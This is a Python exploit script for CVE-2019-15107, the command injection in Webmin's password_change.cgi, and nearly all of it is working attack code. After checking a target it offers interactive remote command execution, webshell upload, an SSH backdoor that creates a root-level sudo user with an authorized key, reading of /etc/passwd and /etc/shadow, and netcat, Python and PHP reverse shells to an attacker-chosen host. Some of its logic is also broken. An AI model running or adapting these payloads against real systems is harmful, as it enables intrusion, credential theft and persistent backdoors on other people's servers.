#!/usr/bin/python
# Imports:
import crypt
import requests
from urllib.parse import quote_plus

# TODO: add CVE-2019-12840

# Checking Functions
def check_15107(url):
    isVulnerable = False
    # Query the /password_change.cgi file to see if it's enabled on the webserver
    try:
        file_check_response = requests.get(f"{url}/password_change.cgi",
                                           headers={"Referer":f"{url}/session_login.cgi", "Content-type":"application/x-www-form-urlencoded"},
                                           cookies={"Cookie":"redirect=1; testing=1; sid=x; sessiontest=1"}, verify=False)
        if file_check_response.status_code == 200 and "Password changing is not enabled!" not in file_check_response.text:
            print(f"\033[1;32m[{url}]\033[1;m password_change.cgi exists")
            # If there is a password_change.cgi file, the next step is determining if the file is actually vulnerable to
            # command injection. To do this, we attempt to inject the command `echo vulnerable` in the request. If the
            # injection is successful, the response should contain 'vulnerable'
            RCE_check_rsp = requests.post(f"{url}/password_change.cgi",
                                          headers={"Referer":f"{url}/session_login.cgi", "Content-type":"application/x-www-form-urlencoded"},
                                          cookies={"Cookie":"redirect=1; testing=1; sid=x; sessiontest=1"},
                                          data={"data":"user=root&pam=&expired=2&old=AkkuS%7cecho%20vulnerable%20&new1=akkuss&new2=akkuss"}, verify=False)
            if RCE_check_rsp.status_code == 200 and "vulnerable" in RCE_check_rsp.text:
                isVulnerable = True
    except Exception as e:
        print(f"\033[1;31m[-]\033[1;m {e}")

    return isVulnerable
def check_12840(url):
  pass
# Payload Functions:
def basic_execute(url):
    while True:
        cmd = input(f"\033[1;33m[*]\033[1;m Enter command (or exit): ")
        if cmd.lower() == 'exit':
            break
        else:
            encoded_cmd = quote_plus(cmd)
            try:
                cmd_rsp = requests.post(f"{url}/password_change.cgi",
                                      headers={"Referer": f"{url}/session_login.cgi", "Content-type": "application/x-www-form-urlencoded"},
                                      cookies={"Cookie": "redirect=1; testing=1; sid=x; sessiontest=1"},
                                      data={"data":f"user=root&pam=&expired=2&old=AkkuS%7c{encoded_cmd}%20&new1=akkuss&new2=akkuss"}, verify=False)
                print(cmd_rsp.text)
            except Exception as e:
                print(f"\033[1;31m[-]\033[1;m {e}")
def deploy_webshell(url):
    file_input = input("Enter the path to the webshell file: ")
    hostname = input(f"Enter the hostname: ")
    with open(file_input, 'r') as shellfile:
        cmd = f"echo -n '{shellfile.read()}' > /var/www/{hostname}/shell.php"
        try:
            exploit_rsp = requests.post(f"{url}/password_change.cgi",
                                        headers={"Referer": f"{url}/session_login.cgi", "Content-type": "application/x-www-form-urlencoded"},
                                        cookies={"Cookie": "redirect=1; testing=1; sid=x; sessiontest=1"},
                                        data={"data": f"user=root&pam=&expired=2&old=AkkuS%7c{quote_plus(cmd)}%20&new1=akkuss&new2=akkuss"}, verify=False)
            print(exploit_rsp.text)
        except Exception as e:
            print(f"\033[1;31m[-]\033[1;m {e}")
def ssh_backdoor(url):
    username = input("\033[1;33m[*]\033[1;m Enter username for new user: ")
    password = input("\033[1;33m[*]\033[1;m Enter password for new user: ")
    hashed_password = crypt.crypt(password, "$6$P9zn0KwR")
    key = input("\033[1;33m[*]\033[1;m Enter public key : ")

    commands = [f"adduser -u 0 --password {hashed_password} {username}", f"usermod -aG sudo {username}",
                f"echo '{key}' >> /home/{username}/.ssh/authorized_keys"]
    for cmd in commands:
        try:
            exploit_rsp = requests.post(f"{url}/password_change.cgi",
                                        headers={"Referer": f"{url}/session_login.cgi", "Content-type": "application/x-www-form-urlencoded"},
                                        cookies={"Cookie": "redirect=1; testing=1; sid=x; sessiontest=1"},
                                        data={ "data": f"user=root&pam=&expired=2&old=AkkuS%7c{quote_plus(cmd)}%20&new1=akkuss&new2=akkuss"}, verify=False)
            print(exploit_rsp.text)
        except Exception as e:
            print(f"\033[1;31m[-]\033[1;m {e}")
def reverse_shell(url):
    rhost = input("\033[1;33m[*]\033[1;m Enter the remote host: ")
    rport = input("\033[1;33m[*]\033[1;m Enter the remote port: ")
    while True:
        shelltype = input("\033[1;33m[*]\033[1;m [netcat] shell, [python] shell, [php] shell: ")
        if shelltype.lower() == 'netcat':
            cmd = f"nc -e /bin/bash {rhost} {rport}"
        elif shelltype.lower() == 'python':
            cmd = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{rhost}',{rport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')'"
        elif shelltype.lower() == 'php':
            cmd = f"php -r '$sock=fsockopen('{rhost}',{rport});exec('/bin/sh -i <&3 >&3 2>&3');'"
        else:
            print("\033[1;31m[!]\033[1;m Invalid shell type.")
            continue
        break
    try:
        exploit_rsp = requests.post(f"{url}/password_change.cgi",
                                    headers={"Referer": f"{url}/session_login.cgi", "Content-type": "application/x-www-form-urlencoded"},
                                    cookies={"Cookie": "redirect=1; testing=1; sid=x; sessiontest=1"},
                                    data={"data": f"user=root&pam=&expired=2&old=AkkuS%7c{quote_plus(cmd)}%20&new1=akkuss&new2=akkuss"}, verify=False)
        print(exploit_rsp.text)
    except Exception as e:
        print(f"\033[1;31m[-]\033[1;m {e}")
# exploit
def exploit(url, payload_dict, payloads_to_run, function_payloads):
    for payload in payloads_to_run:
        if payload in function_payloads():
            (payload_dict[payload])(url)
        try:
            exploit_rsp = requests.post(f"{url}/password_change.cgi",
                                          headers={"Referer": f"{url}/session_login.cgi", "Content-type": "application/x-www-form-urlencoded"},
                                          cookies={"Cookie": "redirect=1; testing=1; sid=x; sessiontest=1"},
                                          data={"data":f"user=root&pam=&expired=2&old=AkkuS%7c{payload_dict[payload]}%20&new1=akkuss&new2=akkuss"}, verify=False)
            print(exploit_rsp.text)
        except Exception as e:
            print(f"\033[1;31m[-]\033[1;m {e}")
# Main:
def main():
    target_url = input("Enter the URL (including scheme): ")
    if target_url.endswith('/'):
        target_url = target_url[:-1]
    isVuln = check_15107(target_url)

    if isVuln is True:
        print(f"\033[1;32m[+]\033[1;m {target_url} is vulnerable to command injection!")
        payloads = {
            "deploy webshell":deploy_webshell,
            "fetch creds": "cat ../../../../../etc/passwd && cat ../../../../../etc/shadow",
            "ssh backdoor": ssh_backdoor,
            "execute commands":basic_execute,
            "reverse shell":reverse_shell
        }
        function_payloads = []
        for k in payloads.keys():
            print(f"[*] {k}\n")
            if type(payloads[k]) is not str:
                function_payloads.append(f"{k}")

        selected_payloads = input("\033[1;33m[*]\033[1;m Enter the payloads to enable, delimited by a comma and a space: ").split(", ")
        for x in selected_payloads:
            if x not in payloads.keys():
                print(f"\033[1;31m[!]\033[1;m Invalid payload: {x}")
                selected_payloads.remove(x)
        exploit(target_url, payloads, selected_payloads, function_payloads)
    else:
        print(f"\033[1;31m[-]\033[1;m {target_url} is not vulnerable to CVE-2019-15107")
if __name__ == "__main__":
    main()


